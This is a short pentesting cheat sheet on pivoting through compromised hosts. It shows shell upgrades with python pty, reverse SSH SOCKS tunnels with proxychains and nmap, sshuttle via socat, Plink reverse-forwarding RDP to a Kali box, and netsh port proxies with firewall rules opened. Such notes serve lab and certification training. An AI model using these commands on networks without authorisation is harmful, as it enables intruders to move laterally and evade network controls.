# SSH

## Remote

```
python -c 'import pty; pty.spawn("/bin/sh")'
/usr/bin/script -qc /bin/bash /dev/null
```
```
X:22--|--Y----Z

   <-SSH--
X:22--|--Y----Z
```

X: sudo systemctl start ssh

Y: ssh -N -R 9999 kali@Xip

```
# Edit /etc/proxychains4.conf
...
# defaults set to "tor"
socks5 127.0.0.1 9999
```

Execute
```
proxychains nmap -p4800-4900 ...
```

# sshuttle

In situations where we have direct access to an SSH server, behind which is a more complex internal network.
you need root privileges on the SSH client machine.

X----Y----Z----A

`Y: socat TCP-LISTEN:2222,fork TCP:Zip:22`

`X: sshuttle -r user@Yip:2222 Yrange/24 Arange/24`

# Plink (Windows)

You can now access local port

```
   <-SSH--
X:22--|---3389:Y
```

```
# Start ssh on kali
sudo systemctl start ssh

# Connect with plink
C:\Windows\Temp\plink.exe -ssh -l kali -pw <YOUR PASSWORD HERE> -R 127.0.0.1:9833:127.0.0.1:3389 Xip

# open new term and Now u have access to 3389
xfreerdp /u:admin /p:P@ssw! /v:127.0.0.1:9833
```

# Netsh

X--|3389--3389Y----22:Z

First you need access to Y with rdp/winrm and admin

```
Y : netsh interface portproxy add v4tov4 listenport=2222 listenaddress=Yip connectport=22 connectaddress=Zip

Y: netsh interface portproxy show all

Y: netsh advfirewall firewall add rule name="port_forward_ssh_2222" protocol=TCP dir=in localip=Yip localport=2222 action=allow


X:  ssh admin@Yip -p2222
```
